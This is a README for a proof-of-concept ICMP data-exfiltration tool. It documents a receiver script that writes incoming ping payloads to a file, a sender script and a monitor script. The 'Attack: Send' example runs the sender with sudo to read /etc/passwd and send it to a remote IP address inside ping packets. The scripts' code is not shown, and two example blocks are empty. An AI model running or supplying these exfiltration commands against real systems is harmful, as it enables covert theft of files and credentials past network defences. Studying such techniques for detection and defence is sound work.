# My-ICMP-Exfiltrator
POC: Python implementation Data Exfiltration using ICMP (Ping Payload)


This uses Python 3.
To install the requirements:
````
pip install -r requirements.txt
`````

## Attack: Receiver
```
python icmp-pong-transfer.py --help
usage: icmp-pong-transfer.py [-h] -w OUTPUT_FILE

options:
  -h, --help            show this help message and exit
  -w OUTPUT_FILE, --write-file OUTPUT_FILE
                        [Required] File to write output.

sudo python icmp-pong-transfer.py -w dump.txt

tail-f dump.txt
```

Example:
```

```

## Attack: Send
```
python icmp-ping-transfer.py --help
usage: icmp-ping-transfer.py [-h] -f READ_FILE -t TARGET

options:
  -h, --help            show this help message and exit
  -f READ_FILE, --read-file READ_FILE
                        [Required] File to send by ping.
  -t TARGET, --target TARGET
                        [Required] Destinaation to send ICMP.

```

Example:
```
sudo python icmp-ping-transfer.py -f /etc/passwd -t 192.168.200.120
```

## Monitor

Example:
````
sudo python icmp-ping-monitor.py
````

